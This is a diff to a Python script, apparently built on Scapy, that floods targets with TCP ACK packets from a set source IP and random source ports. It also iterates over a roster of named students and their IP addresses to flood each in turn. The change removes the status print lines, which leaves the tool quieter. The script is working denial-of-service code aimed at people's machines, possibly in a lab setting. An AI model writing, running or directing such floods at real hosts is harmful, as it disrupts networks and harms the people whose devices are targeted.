@@ -29,7 +29,6 @@ def ack_flood(dest_ip, dest_port, packet_count=1000, src_ip="192.168.28.203"):
     The source port is randomized for each packet. A brief sleep is
     inserted to limit the rate.
     """
-    print(f"[+] Starting ACK flood {dest_ip}:{dest_port} ({packet_count} packets)")
     for _ in range(packet_count):
         src_port = random.randint(1024, 65535)
         pkt = IP(src=src_ip, dst=dest_ip) / TCP(sport=src_port, dport=dest_port, flags="A")
@@ -39,12 +38,10 @@ def ack_flood(dest_ip, dest_port, packet_count=1000, src_ip="192.168.28.203"):
 
 def attack_group(group_name, roster, port, count):
     if group_name not in roster:
-        print(f"Group '{group_name}' not found")
         return
 
     group = roster[group_name]
     for student, ip in group.items():
-        print(f"{student} -> {ip}:{port}")
         ack_flood(ip, port, packet_count=count)
 
 
